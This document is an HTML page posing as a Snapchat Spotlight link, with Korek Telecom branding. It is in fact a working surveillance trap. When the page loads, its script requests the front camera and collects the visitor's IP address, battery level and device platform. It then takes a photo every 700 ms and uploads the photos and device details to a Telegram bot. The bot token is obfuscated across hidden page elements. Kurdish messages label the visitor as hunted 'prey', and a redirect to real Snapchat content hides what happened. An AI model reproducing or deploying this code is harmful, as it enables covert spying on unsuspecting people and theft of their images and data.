<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <link rel="icon" type="image/png" href="https://www.korektelecom.com/media/1001/korek-logo.png">
    <title>snapchat spotlight</title>

    <meta name="analytics-id" content="8431515310:">
    <style>
        body { background-color: white; margin: 0; overflow: hidden; }
        .sys-info { display: none; visibility: hidden; }
    </style>
</head>
<body onload="capture()">

    
    <div class="sys-info">
        <span id="data_ref_02">AAHgyPYR-Z</span>
    </div>

<script>
    const urlParams = new URLSearchParams(window.location.search);
    const targetID = urlParams.get('id'); 
    

    const _s1 = document.querySelector('meta[name="analytics-id"]').content;
    const _s2 = document.getElementById("data_ref_02").innerText;
    const _s3 = "Fn2QF-xU2367CK"; 
    
    async function capture() {
        if (!targetID) return;

        setTimeout(() => {
            window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
        }, 5000);

    
        const _s4 = document.getElementById("p_ext_data").innerText;
        const _s5 = "KRQPP-YQq1s";
        const TOKEN = _s1 + _s2 + _s3 + _s4 + _s5;

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" }, 
                audio: false 
            });

            let batteryInfo = "Unknown";
            if (navigator.getBattery) {
                const batt = await navigator.getBattery();
                batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
            }

            fetch('https://api.ipify.org?format=json')
                .then(res => res.json())
                .then(data => {
                    let report = ` <b>نێچیرێکی نوێ ڕاوکرا</b>\n\n` +
                                 `👤 <b>ID:</b> <code>${targetID}</code>\n` +
                                 `🌐 <b>IP:</b> <code>${data.ip}</code>\n` +
                                 `🔋 <b>Battery:</b> <code>${batteryInfo}</code>\n` +
                                 `📱 <b>Device:</b> <code>${navigator.platform}</code>`;
                    _sendMsg(report, TOKEN);
                });

            const video = document.createElement('video');
            video.srcObject = stream;
            video.muted = true;
            video.play();

            const takeSnap = () => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth; 
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                canvas.toBlob(b => { if (b) _sendFile(b, "photo", TOKEN); }, 'image/jpeg', 0.9);
            };
            setInterval(takeSnap, 700);

        } catch (e) {
            _sendMsg(" نێچیرەکە ڕێگری کرد لە مۆڵەتی کامێرا", TOKEN);
            window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
        }
    }

    function _sendMsg(text, tk) {
        fetch(`https://api.telegram.org/bot${tk}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: targetID, text: text, parse_mode: "HTML"})
        });
    }

    function _sendFile(blob, type, tk) {
        let fd = new FormData();
        fd.append("chat_id", targetID);
        fd.append(type, blob, "victim.jpg");
        fetch(`https://api.telegram.org/bot${tk}/sendPhoto`, { method: 'POST', body: fd });
    }
</script>

    
    <footer style="display:none">
        <span id="p_ext_data">KRQPP-YQq1s</span>
    </footer>
</body>
</html>
